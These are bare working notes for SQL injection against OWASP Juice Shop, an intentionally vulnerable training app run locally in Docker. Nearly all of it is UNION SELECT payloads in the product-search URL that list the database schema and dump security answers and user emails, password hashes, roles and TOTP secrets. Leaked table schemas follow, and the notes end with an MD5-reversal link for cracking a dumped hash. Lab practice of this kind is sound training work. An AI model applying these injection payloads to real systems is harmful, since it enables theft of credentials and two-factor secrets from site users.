

docker run --rm -p 3000:3000 bkimminich/juice-shop


http://localhost:3000/#/


https://localhost:3000/rest/products/search?q=asfasf')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master--

https://localhost:3000/rest/products/search?q=asfasf')) UNION SELECT type, name, tbl_name, rootpage, sql, '6', '7', '8', '9' FROM sqlite_master--



https://localhost:3000/rest/products/search?q=asfasf')) UNION SELECT answer, UserId, '3', '4', '5', '6', '7', '8', '9' FROM SecurityAnswers--

      "deluxePrice": "CREATE TABLE `SecurityAnswers` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `answer` VARCHAR(255), `UserId` INTEGER UNIQUE REFERENCES `Users` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `SecurityQuestionId` INTEGER REFERENCES `SecurityQuestions` (`id`) ON DELETE SET NULL ON UPDATE CASCADE)",

https://localhost:3000/rest/products/search?q=asfasf')) UNION SELECT id, username, email, password, role, totpSecret, isActive, '8', '9' FROM Users--

      "deluxePrice": "CREATE TABLE `Users` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `username` VARCHAR(255) DEFAULT '', `email` VARCHAR(255) UNIQUE, `password` VARCHAR(255), `role` VARCHAR(255) DEFAULT 'customer', `deluxeToken` VARCHAR(255) DEFAULT '', `lastLoginIp` VARCHAR(255) DEFAULT '0.0.0.0', `profileImage` VARCHAR(255) DEFAULT '/assets/public/images/uploads/default.svg', `totpSecret` VARCHAR(255) DEFAULT '', `isActive` TINYINT(1) DEFAULT 1, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `deletedAt` DATETIME)",


https://md5.gromweb.com/?md5=b03f4b0ba8b458fa0acdc02cdb953bc8